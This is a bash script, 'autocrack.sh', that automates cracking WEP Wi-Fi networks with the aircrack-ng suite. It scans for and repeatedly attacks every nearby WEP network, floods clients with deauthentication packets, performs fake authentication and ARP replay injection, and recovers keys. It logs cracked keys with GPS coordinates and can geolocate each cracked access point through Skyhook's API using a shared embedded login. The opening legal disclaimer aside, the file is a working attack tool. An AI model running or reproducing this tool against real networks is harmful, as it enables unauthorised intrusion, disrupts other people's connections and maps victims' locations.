#!/bin/bash
###############################################################
#Please remember that in some areas it is illegal to use this #
#program without the express permission of the wifi,s owner   #
###############################################################
#
# This program will work on Ubuntu 10.04 LTS Ubuntu 9.10, Ubuntu9.04, Ubuntu 8.10 
# and Backtrack3/4/5 without modification 
# This program needs the Aircrack-ng suit to function
# Run this program to automatically start attacking all WEP networks near by
#
#sets this file name
basefilename=$(basename "$0")
#
#used to change working dir to the same as this script's
DIR="$( cd "$( dirname "$0" )" && pwd )"
#
#To go back to useing startaircrack change below to usestartaircrack="yes" 
usestartaircrack="no" 
#
#To skip package check simply change below to festivaltest="yes"
festivaltest=`apt-cache pkgnames festival`
#
#To skip package check simply change below to aircracktest="yes"
aircracktest=`apt-cache pkgnames aircrack-ng`
#
#Sets CLIENT_MAC to this computers mac address. I think that if you were to enter a fake mac it might work 
#example - CLIENT_MAC="00:00:00:00:00"
function setclientmac {
	CLIENT_MAC=` ip link show $WIFI | tail -n 1 |  cut -f 6 -d " "`
}
basefilename2="autocrack.sh"
#
if [ x"$basefilename2" != x"autocrack.sh" ];then
	echo "This file is named $basefilename"
	echo "Please rename this file to autocrack.sh"
	echo "now quitting"
	sleep 10s
	exit;
fi
#sets working DIR to the same as this bash file.
cd $DIR
function voiceisago {
	festival --tts voicetempfile.txt 2>/dev/null
	rm voicetempfile.txt 2>/dev/null
}
#debug?
set +v
#Was "voice" typed in anywhere?
if [ x"$1" = x"voice" -o x"$2" = x"voice" -o x"$3" = x"voice" -o x"$4" = x"voice" -o x"$5" = x"voice" ];then
	voice="yes"
	echo "Festival initialized" > voicetempfile.txt
	voiceisago	
else
	voice="no"
fi
#test voice output
if [ x"$1" = x"voicetest" ];then
	echo "This is a test of auto crack's ability to vocalize echo requests." > voicetempfile.txt
	voiceisago
	exit
fi
if [ x"$1" = x"makecopy" ];then
#Use this when making major modifications to startaircrack.
#make your modifications, run "./autocrack.sh makecopy" then run "copystartaircrack.sh"
#replace startaircrack in this script with that of startaircrack01.sh
	LINE1='"$LINE"'
	LINE=`echo "'$LINE1'"`
	echo '#!/bin/bash' >>copystartaircrack.sh
	echo 'cat startaircrack.sh | while read LINE ; do' >>copystartaircrack.sh
	echo '	echo "echo '"$LINE"' >>startaircrack.sh" >>startaircrack01.sh' >>copystartaircrack.sh
	echo 'done' >>copystartaircrack.sh
	chmod 777 copystartaircrack.sh
	exit
fi
##########This is the start of the "autocrack.sh help" function
if [ x"$1" = x"help" -o x"$1" = x"--help" -o x"$1" = x"-help" ];then
	echo "Usage: $basefilename [ options - up to 7 arguments]"
	echo "example: ./autocrack.sh wlan0 auto voice"
	echo "help		#Prints this help screen"
	echo "WIFICARD	#Replace the word 'WIFICARD' with the name of" 
	echo "			  your wifi card (optional, usfull if you have"
	echo "			  more than one card)"
	echo "auto		#Repeatly attack all WEP networks nearby"
	echo "			(usefull if your moving)"
	echo "locate		#If you have an active internet connection this"
	echo "			 will go though the wifi networks you hacked and"
	echo "			 print their location on screen if found in "
	echo "			 Skyhook's database"
	echo "locate NETWORK	#Does the same thing as 'autocrack.sh locate' "
	echo "			  exept that it will only look for one wifi "
	echo "			  network. Replace the word 'NETWORK' with the "
	echo "			  name of the network you wish to locate. "
	echo "			  only works if you have tried to hack it"
	echo "removemon		#Turns monitor mode off on all wifi cards"
	echo "clean		#Removed everything from the current DIR exept "
	echo "			 folders and this program"
	echo "cleanupmon	#Combines 'autocrack.sh removemon' "
	echo "			 and 'autocrack.sh clean'"
	echo "make		#Makes a program called 'startaircrack.sh' this program"
	echo "			 is useful for single attacks and is needed by autocrack"
	echo "			(it will be created automaticly if you dont make it)"
	echo "voice		#Will use festival if installed to vocolize key elements"
	echo "			of the script's output."
	echo "passive		#Will disable any functions that would otherwise send packets"
	echo "			Very useful if your attacking an active network"
exit
fi
function deauthenticate {
	percentcounter=$((0))
	# Attempts to deauthenticate any/all clients on attacking channel
	#xterm -fn fixed -geom -0-0 -title "Deauthenticating $AIRESSID" -e "aireplay-ng --deauth 0 -a $AIRBSSID $WIFI" &
	#exec 3>&2

	exec 2> /dev/null
	aireplay-ng --deauth 0 -a $AIRBSSID $WIFI 2>/dev/null >/dev/null &
	SCANPID=$!
	#echo "Sending de-authenticate packets"
	#echo "" > stopIVcounter.txt
	if [ x"$voice" = x"yes" ];then
		echo "Sending De-authentication packets to $AIRESSID" > voicetempfile.txt
		voiceisago
	fi
	echo ""
	while [ $((100)) -gt $percentcounter ]; do
		percentcounter=$((percentcounter+1))
		echo -ne "Sending de-authenticate packets: %""${percentcounter}\r"
		sleep 0.10s #0.10 X 100 loops = 10 seconds
	done
	#rm stopIVcounter.txt 2>/dev/null
	echo ""
	#sleep 5s
	kill $SCANPID
	exec 2>&3
	exec 3>&-
	percentcounter=$((0))
}
function listhacked {
	firstrun="yes"
	if [ -e "autocrackdata" ];then
		nothing="yes"
	else
		mkdir autocrackdata
	fi
	ls >tempcollectlist 2>/dev/null
	cat tempcollectlist |while read LINE ; do
		if [ -d "$LINE" -a  x"$LINE" != x"autocrackdata" ];then

			AIRESSID=$LINE

			AIRBSSID=`cat "$LINE"/key_for_*.txt | grep "mac;" | cut -f 2 -d ";" | tr -d [:space:] 2>/dev/null`
			AIRKEY=`cat "$LINE"/key_for_*.txt | grep "FOUND!" | cut -f 4 -d "[" | cut -f 1 -d "]" | tr -d [:space:]` 2>/dev/null
			if [ -e "$LINE"/output-01.kismet.csv ];then
			AIRLONG=`cat "$LINE"/output*.kismet.csv | grep "$LINE" | cut -f 26 -d ";" | tr -d [:space:] 2>/dev/null`
			AIRLAT=`cat "$LINE"/output*.kismet.csv | grep "$LINE" | cut -f 29 -d ";" | tr -d [:space:] 2>/dev/null`
			fi
			echo "$AIRESSID; $AIRKEY"
			if [ x"$firstrun" = x"yes" ];then
			rm autocrackdata/keylist.txt
			echo "ESSID;BSSID;WEPKEY;LONG;LAT" >autocrackdata/keylist.txt
			echo "ESSID;BSSID;WEPKEY;LONG;LAT" >autocrackdata/keylist.csv
			echo "$AIRESSID;$AIRBSSID;$AIRKEY;$AIRLONG;$AIRLAT" >>autocrackdata/keylist.txt
			echo "$AIRESSID;$AIRBSSID;$AIRKEY;$AIRLONG;$AIRLAT" >>autocrackdata/keylist.csv
			firstrun="no"
			else
			echo "$AIRESSID;$AIRBSSID;$AIRKEY;$AIRLONG;$AIRLAT" >>autocrackdata/keylist.txt
			echo "$AIRESSID;$AIRBSSID;$AIRKEY;$AIRLONG;$AIRLAT" >>autocrackdata/keylist.csv
			fi
			
		fi
	done
	chmod 777 autocrackdata/
	chmod 777 autocrackdata/*
	chmod -x autocrackdata/*
	echo "Made a folder called autocrackdata. in that folder you will find a text file and a csv file containing the above keys and GPS locations if avalible"
}
if [ x"$1" = x"listhacked" ]; then
	listhacked
	exit
fi
if [ x"$1" = x"listhacked2" ]; then
	xterm -title "ListHacked" -e "./autocrack.sh listhacked & sleep 20s" 2>/dev/null 
	exit

fi
function usestartaircrackfunction {
	if [ -e "startaircrack.sh" ]; then
		rm startaircrack.sh 2>/dev/null
	fi
	startaircrack
	xterm -fn fixed -title "Attacking: $AIRESSID" -geom +0+0 -e "./startaircrack.sh $AIRBSSID $AIRCHANNEL '$AIRESSID' '$WIFI'" 2>/dev/null &
	SCANPID=$!
}
function temparpupdater {
	while [ -e temparp ]; do
		exec 2> /dev/null
		cat temparp |while read LINE ; do
			if [ x"$LINE" != x"" ]; then
				rm templastlineofarp
				echo "$LINE" > templastlineofarp		
			fi
		done
		arplastline=`cat templastlineofarp`
		exec 2>&3
		exec 3>&-
	done
}
#This function was made in an attept to allow the main echo update it's self while this did it's thing
function forlineintemplsarp {
	for LINE in `cat templsarp`
	do
		if [ x"$passivehack" != x"yes" ]; then
			exec 2> /dev/null
			#Opens aireplay-ng in ARP request replay mode to inject packets
			aireplay-ng -3 -r $LINE -b $AIRBSSID -h $CLIENT_MAC $WIFI >/dev/null 2>/dev/null &
			SCANPID=$!
			sleep 5s
			kill $SCANPID 2>/dev/null
			exec 2>&3
			exec 3>&-
		fi
	done
	rm templsarp
}
# This function and the one below it is startaircrack.sh's replacment
function startthehack {
	#make sure the wifi card is on the right channel
	iwconfig $WIFIforCHANNEL channel $AIRCHANNEL 2>/dev/null
	iwconfig $WIFI channel $AIRCHANNEL 2>/dev/null
	#just waiting a second
	sleep 1s
	numberofIVs=$((0))
	if [ x"$passivehack" != x"yes" ]; then
		#Opens aireplay-ng to do a fake authentication with the access point
		#xterm -fn fixed -geom -0-0 -title "Fake Authentication: $AIRESSID" -e "aireplay-ng -1 6000 -o 1 -q 10m -a $AIRBSSID -h $CLIENT_MAC $WIFI|tee tempauth & sleep 1h" &
		aireplay-ng -1 6000 -o 1 -q 10m -a $AIRBSSID -h $CLIENT_MAC $WIFI|tee tempauth >/dev/null 2>/dev/null &
		echo "$!" > tempSCANPID
		authenticatedyet="|Associating"
		#Opens aireplay-ng in ARP request reply mode to inject packets
		#xterm -fn fixed -geom -0+0 -title "Arp reply $AIRESSID" -e "aireplay-ng -3 -b $AIRBSSID -h $CLIENT_MAC $WIFI|tee temparp & sleep 1h" &
		aireplay-ng -3 -b $AIRBSSID -h $CLIENT_MAC $WIFI|tee temparp >/dev/null 2>/dev/null &
		echo "$!" >> tempSCANPID
	fi
	if [ -e "$AIRESSID" ]; then
		cp "$AIRESSID"/*.cap `pwd` 2>/dev/null
		#icanhasarp=`ls replay_arp*.cap` 2>/dev/null
		#if [ x"$icanhasarp" != x"" ]; then
		#	ls replay_arp*.cap > templsarp 2>/dev/null
		#	forlineintemplsarp &
		#fi
	else 
		# makes folder and sets a placer holder file
		mkdir "$AIRESSID"  >/dev/null 2>/dev/null
		echo "place holder" > "$AIRESSID"/key_for_"$AIRBSSID2".txt
	fi
	#Opens airodump-ng on AP channel with a bssid filter in a new window to collect the new unique IVs
	#xterm -fn fixed -geom +0-0 -title "Airodump: $AIRESSID" -e "airodump-ng -c $AIRCHANNEL --bssid $AIRBSSID -w output $WIFI & sleep 1h" &
	airodump-ng -c $AIRCHANNEL --bssid $AIRBSSID -w output $WIFI >/dev/null 2>/dev/null &
	echo "$!" >> tempSCANPID
}
# This function and the one above is startaircrack.sh's replacment
function startacracking {
	AIRBSSID2=`echo "$AIRBSSID" | tr -d ":"`
	#Starts aircrack
	#xterm -fn fixed -geom -0-0 -title "Fake Authentication: $AIRESSID" -e "aircrack-ng -z -b $AIRBSSID output*.cap -l "$AIRESSID"/"$AIRESSID".key | tee lfkey"
	aircrack-ng -z -b $AIRBSSID output*.cap -l "$AIRESSID"/"$AIRESSID".key | tee lfkey >/dev/null
	echo ""
	for temppid in `cat tempSCANPID`; do kill $temppid > tempkillpid; done 2>/dev/null
	echo "$AIRESSID" > "$AIRESSID"/key_for_"$AIRBSSID2".txt
	echo "mac; $AIRBSSID" >> "$AIRESSID"/key_for_"$AIRBSSID2".txt
	grep "KEY FOUND" lfkey >> "$AIRESSID"/key_for_"$AIRBSSID2".txt
	tempkeyfound01=`grep "KEY FOUND" lfkey|cut -b 9,10`
	if [ x$tempkeyfound01 != x"KE" ]; then
		echo "$AIRESSID" > "$AIRESSID"/key_for_"$AIRBSSID2".txt
		echo "mac; $AIRBSSID" >> "$AIRESSID"/key_for_"$AIRBSSID2".txt
		echo "KEY FOUND: Attack was unsuccessful" >> "$AIRESSID"/key_for_"$AIRBSSID2".txt
		for temppid in `cat tempSCANPID`; do kill $temppid > tempkillpid; done 2>/dev/null
	fi
	mv temp* "$AIRESSID" 2>/dev/null
	mv *.cap "$AIRESSID" 2>/dev/null
	mv config.* "$AIRESSID" 2>/dev/null
	mv lfkey "$AIRESSID" 2>/dev/null
	mv lfcard "$AIRESSID" 2>/dev/null
	mv output-* "$AIRESSID" 2>/dev/null
	cp maclist "$AIRESSID" 2>/dev/null
	chmod +r "$AIRESSID"/* 2>/dev/null
	chmod +r "$AIRESSID" 2>/dev/null
}
function cleanup {
	for temppid in `cat tempSCANPID`; do kill $temppid > tempkillpid; done 2>/dev/null
	rm *.cap 2>/dev/null
	rm temp* 2>/dev/null
	rm *temp* 2>/dev/null
	rm maclist 2>/dev/null
	rm output* 2>/dev/null
	rm *output* 2>/dev/null
	rm testprogram.sh 2>/dev/null
	rm rangefinder 2>/dev/null
	rm tempSCANPID  2>/dev/null
	rm config*  2>/dev/null
	rm lfkey  2>/dev/null
	rm lfcard  2>/dev/null
}
function cleancap {
	ls >tempfilelist
	cat tempfilelist |while read LINE ; do
		if [ -d "$LINE" ];then
			rm "$LINE"/*.cap
		fi
	done
	exit
}
function startaircrack {
	echo '#!/bin/bash' >>startaircrack.sh
echo '# This file should be saved as "startaircrack.sh"' >>startaircrack.sh
echo '#Checks to see if this is being ran as root' >>startaircrack.sh
echo 'if [ x"`which id 2> /dev/null`" != "x" ]; then' >>startaircrack.sh
echo 'USERID="`id -u 2> /dev/null`"' >>startaircrack.sh
echo 'fi' >>startaircrack.sh
echo 'if [ x$USERID = "x" -a x$UID != "x" ]; then' >>startaircrack.sh
echo 'USERID=$UID' >>startaircrack.sh
echo 'fi' >>startaircrack.sh
echo 'if [ x$USERID != "x" -a x$USERID != "x0" ]; then' >>startaircrack.sh
echo 'echo Run it as root ; exit ;' >>startaircrack.sh
echo 'fi' >>startaircrack.sh
echo '#sets a few var' >>startaircrack.sh
echo 'AIRTIME=300' >>startaircrack.sh
echo 'NUMBER=0' >>startaircrack.sh
echo 'set +v' >>startaircrack.sh
echo '#Finds the name of your wifi card' >>startaircrack.sh
echo 'if [ x$4 = x ]; then' >>startaircrack.sh
echo 'airmon-ng|grep "-"|cut -b 1,2,3,4,5 > clist' >>startaircrack.sh
echo 'for TEST in `cat clist`; do WCOUNT=$((WCOUNT+1));done' >>startaircrack.sh
echo 'for ESSID in `cat clist`; do WIFI=`echo $ESSID`; done' >>startaircrack.sh
echo 'else' >>startaircrack.sh
echo 'WIFI=$4' >>startaircrack.sh
echo 'WCOUNT=1' >>startaircrack.sh
echo 'fi' >>startaircrack.sh
echo 'if [ x$WIFI = x ]; then' >>startaircrack.sh
echo 'echo "No wifi card detected. Quitting"' >>startaircrack.sh
echo 'exit' >>startaircrack.sh
echo 'fi' >>startaircrack.sh
echo '#Scans for more than one wifi card' >>startaircrack.sh
echo 'if [ x$WCOUNT != x$((0+1)) ]; then' >>startaircrack.sh
echo 'TEST=`cat clist`' >>startaircrack.sh
echo 'echo $TEST|cut -b 1,2,3,4,5 > null' >>startaircrack.sh
echo 'WIFI=`cat null`' >>startaircrack.sh
echo 'echo "Multiple WiFi cards detected. Using $WIFI"' >>startaircrack.sh
echo '#If you want to specify your own wifi card; un-comment the line below' >>startaircrack.sh
echo '#WIFI=ath0' >>startaircrack.sh
echo 'fi' >>startaircrack.sh
echo 'rm clist 2> /dev/null' >>startaircrack.sh
echo '#Start the wireless interface in monitor mode' >>startaircrack.sh
echo 'if [ x$4 = x ]; then' >>startaircrack.sh
echo 'airmon-ng start $WIFI >tempairmonoutput' >>startaircrack.sh
echo 'WIFI=`cat tempairmonoutput|grep "monitor mode enabled on" |cut -b 30-50 | tr -d [:space:] |tr -d ")"`' >>startaircrack.sh
echo 'if [ x$WIFI = x ];then' >>startaircrack.sh
echo 'WIFI=`cat tempairmonoutput|grep "monitor mode enabled" |cut -b 1-9 | tr -d [:space:]`' >>startaircrack.sh
echo 'fi' >>startaircrack.sh
echo 'fi' >>startaircrack.sh
echo '#sets the CLIENT_MAC var as the mac of this computer' >>startaircrack.sh
echo 'CLIENT_MAC=` ip link show $WIFI | tail -n 1 | cut -f 6 -d " "`' >>startaircrack.sh
echo 'commandssid02=$1' >>startaircrack.sh
echo 'if [ x"$1" != x"" ];then' >>startaircrack.sh
echo 'commandssid=`echo "$1" | grep : | tr -d [:space:]`' >>startaircrack.sh
echo 'if [ x"$commandssid" = x"" ];then' >>startaircrack.sh
echo 'commandssid="true"' >>startaircrack.sh
echo 'fi' >>startaircrack.sh
echo 'fi' >>startaircrack.sh
echo '#Checks to see if anything was entered after the command to run this program' >>startaircrack.sh
echo 'if [ x$1 != x -a x"$commandssid" != x"true" ]; then' >>startaircrack.sh
echo '#I guess something was entered, well then lets assume the following true, and skip the listing of APs' >>startaircrack.sh
echo 'AIRBSSID=$1' >>startaircrack.sh
echo 'AIRCHANNEL=$2' >>startaircrack.sh
echo 'AIRESSID=$3' >>startaircrack.sh
echo 'AIRBSSID2=`echo "$AIRBSSID" | tr -d ":"`' >>startaircrack.sh
echo 'mkdir "$AIRESSID"' >>startaircrack.sh
echo 'else' >>startaircrack.sh
echo '#lists wifi networks in the area and prompts user to choose one' >>startaircrack.sh
echo 'rm temp-* 2</dev/null' >>startaircrack.sh
echo 'airodump-ng -w temp $WIFI &' >>startaircrack.sh
echo 'SCANPID=$!' >>startaircrack.sh
echo 'sleep 20s' >>startaircrack.sh
echo 'kill $SCANPID' >>startaircrack.sh
echo 'sleep 1s' >>startaircrack.sh
echo 'cat temp-* | strings | grep -B1000 Station | grep ":" | cut -f 1,4,5,6,8,14 -d "," > templist02' >>startaircrack.sh
echo 'grep "WEP" templist02 > templist' >>startaircrack.sh
echo '#grep "WPA" templist02 >> templist' >>startaircrack.sh
echo '#grep "OPN" templist02 >> templist' >>startaircrack.sh
echo 'rm config.* 2>/dev/null' >>startaircrack.sh
echo 'NUMBER=0' >>startaircrack.sh
echo 'skipasknumber=""' >>startaircrack.sh
echo 'for EACHMAC in `cat templist | cut -f 1 -d , | tr ":" "-"`' >>startaircrack.sh
echo 'do' >>startaircrack.sh
echo 'NUMBER=$((NUMBER+1))' >>startaircrack.sh
echo 'REALMAC=`echo $EACHMAC | tr "-" ":"`' >>startaircrack.sh
echo 'CHANNEL=`cat templist | grep $REALMAC | cut -f 2 -d , | tr -d [:space:]`' >>startaircrack.sh
echo 'ENCRYPTION=`cat templist | grep $REALMAC | cut -f 4 -d , | tr -d [:space:]`' >>startaircrack.sh
echo 'SSID=`cat templist | grep $REALMAC | cut -f 6 -d ,| cut -f 2-100 -d " "`' >>startaircrack.sh
echo 'echo export AIRESSID="$SSID" > config.$NUMBER' >>startaircrack.sh
echo 'echo export AIRCHANNEL=$CHANNEL >> config.$NUMBER' >>startaircrack.sh
echo 'echo export AIRBSSID=$REALMAC >> config.$NUMBER' >>startaircrack.sh
echo 'echo export AIRBSSID2=`echo "$REALMAC" | tr -d ":"` >> config.$NUMBER' >>startaircrack.sh
echo 'if [ x"$commandssid" = x"true" ];then' >>startaircrack.sh
echo 'if [ x"$SSID" = x"$1" ];then' >>startaircrack.sh
echo 'skipasknumber=$NUMBER' >>startaircrack.sh
echo 'fi' >>startaircrack.sh
echo 'else' >>startaircrack.sh
echo 'echo "#"$NUMBER: $SSID, $ENCRYPTION, $CHANNEL, $REALMAC' >>startaircrack.sh
echo '#echo SSID: $SSID' >>startaircrack.sh
echo '#echo "Encryption type:" $ENCRYPTION' >>startaircrack.sh
echo '#echo "Channel:" $CHANNEL' >>startaircrack.sh
echo '#echo "Mac Address:" $REALMAC' >>startaircrack.sh
echo 'fi' >>startaircrack.sh
echo 'done' >>startaircrack.sh
echo 'if [ x"$skipasknumber" != x"" ];then' >>startaircrack.sh
echo 'NUMBER=$skipasknumber' >>startaircrack.sh
echo 'else' >>startaircrack.sh
echo 'echo "At the moment only WEP networks are supported"' >>startaircrack.sh
echo 'read -p "Please choose your wifi network by the WIFI Number:" NUMBER' >>startaircrack.sh
echo 'fi' >>startaircrack.sh
echo 'source config.$NUMBER' >>startaircrack.sh
echo 'mkdir "$AIRESSID" >/dev/null 2>/dev/null' >>startaircrack.sh
echo 'iwconfig $WIFI channel $AIRCHANNEL' >>startaircrack.sh
echo 'echo "=================Starting on WiFi network "$AIRESSID"================="' >>startaircrack.sh
echo 'fi' >>startaircrack.sh
echo 'echo "place holder" > "$AIRESSID"/key_for_"$AIRBSSID2".txt' >>startaircrack.sh
echo 'iwconfig $WIFI channel $AIRCHANNEL' >>startaircrack.sh
echo 'sleep 1s' >>startaircrack.sh
echo '#Opens popup with aireplay-ng to do a fake authentication with the access point' >>startaircrack.sh
echo 'xterm -fn fixed -geom -0-0 -title "Fake Authentication: $AIRESSID" -e "aireplay-ng -1 6000 -o 1 -q 10m -a $AIRBSSID -h $CLIENT_MAC $WIFI|tee tempauth & sleep 120h" 2>/dev/null &' >>startaircrack.sh
echo 'echo "$!" > tempSCANPID' >>startaircrack.sh
echo '#Opens popup with aireplay-ng in ARP request replay mode to inject packets in new window' >>startaircrack.sh
echo 'xterm -fn fixed -geom +0-0 -title "Arp Replay: $AIRESSID" -e "aireplay-ng -3 -b $AIRBSSID -h $CLIENT_MAC $WIFI|tee temparp" 2>/dev/null &' >>startaircrack.sh
echo 'echo "$!" >> tempSCANPID' >>startaircrack.sh
echo '#Opens popup with airodump-ng on AP channel with a bssid filter in a new window to collect the new unique IVs' >>startaircrack.sh
echo 'xterm -fn fixed -geom -0+0 -title "Packet Capture: $AIRESSID" -e "airodump-ng -c $AIRCHANNEL --bssid $AIRBSSID -w output $WIFI" 2>/dev/null &' >>startaircrack.sh
echo 'echo "$!" >> tempSCANPID' >>startaircrack.sh
echo '#waits while airodump gathers data' >>startaircrack.sh
echo '#clear' >>startaircrack.sh
echo 'echo "$AIRESSID" > "$AIRESSID"/key_for_"$AIRBSSID2".txt' >>startaircrack.sh
echo 'echo "mac; $AIRBSSID" >> "$AIRESSID"/key_for_"$AIRBSSID2".txt' >>startaircrack.sh
echo 'read -p "Please wait "$(($AIRTIME/60))" minutes or press ENTER to skip the timer" -t $AIRTIME null' >>startaircrack.sh
echo '#Starts aircrack' >>startaircrack.sh
echo 'aircrack-ng -z -b $AIRBSSID output*.cap -l "$AIRESSID".key | tee lfkey' >>startaircrack.sh
echo 'for temppid in `cat tempSCANPID`; do kill $temppid > tempkillpid; done 2>/dev/null' >>startaircrack.sh
echo 'grep "KEY FOUND" lfkey >> "$AIRESSID"/key_for_"$AIRBSSID2".txt' >>startaircrack.sh
echo 'if [ x$4 = x ]; then' >>startaircrack.sh
echo '#Stops the WiFi card and brings it back up for use by the user.' >>startaircrack.sh
echo 'echo "now removing temp interfaces"' >>startaircrack.sh
echo '#Finds any remaining interfaces and removes them (could take a while if you have more than 10)' >>startaircrack.sh
echo 'iwconfig|grep "Monitor"|cut -b 1,2,3,4,5 > lfcard 2>/dev/null' >>startaircrack.sh
echo 'for tdevice in `cat lfcard`; do airmon-ng stop $tdevice; done 2>/dev/null' >>startaircrack.sh
echo 'fi' >>startaircrack.sh
echo 'tempkeyfound01=`grep "KEY FOUND" lfkey|cut -b 9,10`' >>startaircrack.sh
echo 'if [ x$tempkeyfound01 != x"KE" ]; then' >>startaircrack.sh
echo 'echo "$AIRESSID" > "$AIRESSID"/key_for_"$AIRBSSID2".txt' >>startaircrack.sh
echo 'echo "mac; $AIRBSSID" >> "$AIRESSID"/key_for_"$AIRBSSID2".txt' >>startaircrack.sh
echo 'echo "KEY FOUND: Attack was unsuccessful" >> "$AIRESSID"/key_for_"$AIRBSSID2".txt' >>startaircrack.sh
echo 'for temppid in `cat tempSCANPID`; do kill $temppid > tempkillpid; done 2>/dev/null' >>startaircrack.sh
echo 'fi' >>startaircrack.sh
echo '#Moves all the temp files and the file containing the key in to the folder just made' >>startaircrack.sh
echo '' >>startaircrack.sh
echo 'mv temp* "$AIRESSID" 2>/dev/null' >>startaircrack.sh
echo 'mv *.cap "$AIRESSID" 2>/dev/null' >>startaircrack.sh
echo 'mv config.* "$AIRESSID" 2>/dev/null' >>startaircrack.sh
echo 'mv lfkey "$AIRESSID" 2>/dev/null' >>startaircrack.sh
echo 'mv lfcard "$AIRESSID" 2>/dev/null' >>startaircrack.sh
echo 'mv output-* "$AIRESSID" 2>/dev/null' >>startaircrack.sh
echo 'cp maclist "$AIRESSID" 2>/dev/null' >>startaircrack.sh
echo 'chmod 777 "$AIRESSID"/* 2>/dev/null' >>startaircrack.sh
echo 'chmod 777 "$AIRESSID" 2>/dev/null' >>startaircrack.sh
echo '#a frendly message' >>startaircrack.sh
echo 'echo "If your key was found it will be in a folder with the same name as your WiFi AP"' >>startaircrack.sh
echo 'echo "It will be in a text file named with the name of the target AP"' >>startaircrack.sh
echo 'echo "======================This program is now complete======================="' >>startaircrack.sh
echo 'exit;' >>startaircrack.sh
	chmod +xr startaircrack.sh
}
function reset {
	timercounter=0
	rm rangefinder 2>/dev/null
	rm *.cap 2>/dev/null
	rm clist 2>/dev/null
	rm output-* 2>/dev/null
	rangfinder=0
	testvar01=""
	testvar02=""
	testvar03=""
	for temppid in `cat tempSCANPID`; do kill $temppid > tempkillpid; done 2>/dev/null
}
function stopairmonwificardsplx {
	airmon-ng stop $tdevice 2>/dev/null >/dev/null&
	SCANPID=$!
	PIDOFAIRMON=`pgrep airmon-ng`
	PIDOFAIRMON2=$((PIDOFAIRMON))
	hourglass="|"
	secondcounter=$((0))
	while [ x"$SCANPID" = x"$PIDOFAIRMON" ]; do
		if [ x"$hourglass" = x"|" ]; then 
			hourglass="/"
		else
			if [ x"$hourglass" = x"/" ]; then 
				hourglass="-"
			else
				if [ x"$hourglass" = x"-" ]; then 
					hourglass='\'
				else
					if [ x"$hourglass" = x'\' ]; then 
						hourglass="|"
					fi
				fi
		
			fi
		fi
		echo -ne "Stopping $tdevice ${hourglass}   \r"
		PIDOFAIRMON2=`pgrep airmon-ng`
		if [ x"$PIDOFAIRMON2" = x"" ]; then
			echo ""
			PIDOFAIRMON="exit"
		fi
		sleep 0.05
		secondcounter=$((secondcounter+5))
		if [ x"$secondcounter" = x"800" ]; then
			echo "It seems that airmon is taking a long time. It may have frozen. Quitting"
			exit
		fi
	done
}
function remonvemon {
	count=0
	airmon-ng|cut -b 1,2,3,4,5 > clist01
	count=0
	cat clist01 |while read LINE ; do
	if [ $count -gt 3 ];then #Greater then 3 will get rid of the first 3 lines of the output of airmon-ng
		echo "$LINE" | cut -b 1-5 >>tempairmonstop
		count=$((count+1))
	else
		count=$((count+1))
	fi
	done
	echo "Shutting down wifi cards, Please wait"
	for tdevice in `cat tempairmonstop`
	do
	stopairmonwificardsplx
	#airmon-ng stop $tdevice >/dev/null
	done
	rm clist01
	rm tempairmonstop
	count=0
}
#Checks for needed packages
if [ x"$festivaltest" != x"" ];then
	if [ x"$voice" != x"yes" ];then
		echo "It looks like you have festival installed, have you tried the tts option?"
	fi
else
	echo "This script has the ability to vocalize what its doing"
	echo "if you would like to test this ability please install festival"
	echo "by typing in: apt-get install festival"
	echo "and then restart this script like so: ./autocrack.sh voice"
	echo "or ./autocrack.sh auto voice"
fi
if [ x"$aircracktest" = x"" ];then
	echo "It looks like you dont have Aircrack-ng installed"
	echo "Would you like to try and install aircrack now?"
	read -p "or bypass this error? Y/n/b:" installaircrack
	if [ x"$installaircrack" = x"y" -o x"$installaircrack" = x"Y" ];then
		xterm -fn fixed -title "Attacking: $AIRESSID" -geom +0+0 -e "sudo apt-get install aircrack-ng" 2>/dev/null
		echo "please restart this script"
		exit;		
		
	fi
	if [ x"$installaircrack" = x"n" -o x"$installaircrack" = x"n" ];then
		echo "Quitting"
		exit;		
		
	fi
	if [ x"$installaircrack" = x"b" -o x"$installaircrack" = x"B" ];then
		echo "Ignoring this error"
		
	fi
fi
#is this file being ran as root?
if [ x"`which id 2> /dev/null`" != "x" ]
then
	USERID="`id -u 2> /dev/null`"
fi
if [ x$USERID = "x" -a x$UID != "x" ]
then
	USERID=$UID
fi
if [ x$USERID != "x" -a x$USERID != "x0" ]
then
	#Guess not
	echo Run it as root
	if [ x"$voice" = x"yes" ];then
		echo "Please run this file as root" > voicetempfile.txt
		voiceisago
	fi
	
	exit
fi
if [ x"$1" = x"makestartaircrack" -o x"$1" = x"make" ];then
	if [ -e "startaircrack.sh" ]; then
		rm startaircrack.sh 2>/dev/null
	fi
	startaircrack
	exit
#else
#	if [ -e "startaircrack.sh" ]; then
#		rm startaircrack.sh 2>/dev/null
#	fi
#	startaircrack
fi

if [ x"$1" = x"cleancap" ]; then
	cleancap
fi
#Looks though the DIRs for the key files, then bassed on the mac it uses Skyhooks database to locate the AP
#This function requires curl installed. 
if [ x"$1" = x"locate" -o x"$1" = x"location" ]; then
	if [ x"$2" != x"" ]; then
		echo "========== Now locating $2 =========="
		MYMAC02=`cat "$2"/*.txt|grep "mac; "| tr -d : | tr -d "mac; "| tr -d [:space:]`
		MYMAC=$MYMAC02 && curl --header "Content-Type: text/xml" --data "<?xml version='1.0'?><LocationRQ xmlns='http://skyhookwireless.com/wps/2005' version='2.6' street-address-lookup='full'><authentication version='2.0'><simple><username>beta</username><realm>js.loki.com</realm></simple></authentication><access-point><mac>$MYMAC</mac><signal-strength>-50</signal-strength></access-point></LocationRQ>" https://api.skyhookwireless.com/wps2/location >"$2"/location_$MYMAC02
	else
	ls >filelist
	sleep 1s
	for LINE in `cat filelist`
	do
	if [ -d "$LINE" ]; then
		echo "========== Now locating $LINE =========="
			MYMAC02=`cat "$LINE"/*.txt|grep "mac; "| tr -d : | tr -d "mac; "| tr -d [:space:]`
			MYMAC=$MYMAC02 && curl --header "Content-Type: text/xml" --data "<?xml version='1.0'?><LocationRQ xmlns='http://skyhookwireless.com/wps/2005' version='2.6' street-address-lookup='full'><authentication version='2.0'><simple><username>beta</username><realm>js.loki.com</realm></simple></authentication><access-point><mac>$MYMAC</mac><signal-strength>-50</signal-strength></access-point></LocationRQ>" https://api.skyhookwireless.com/wps2/location >"$LINE"/location_$MYMAC02
			echo `cat "$LINE"/location_*|cut -f 4,6,11,13,15,17,19 -d ">" |tr -d "/"` #>>"$LINE"/key_for_*.txt
	fi
	done
	fi
rm filelist 2>/dev/null
exit
fi
if [ x"$1" = x"removemon" ];then
	remonvemon
	exit
fi
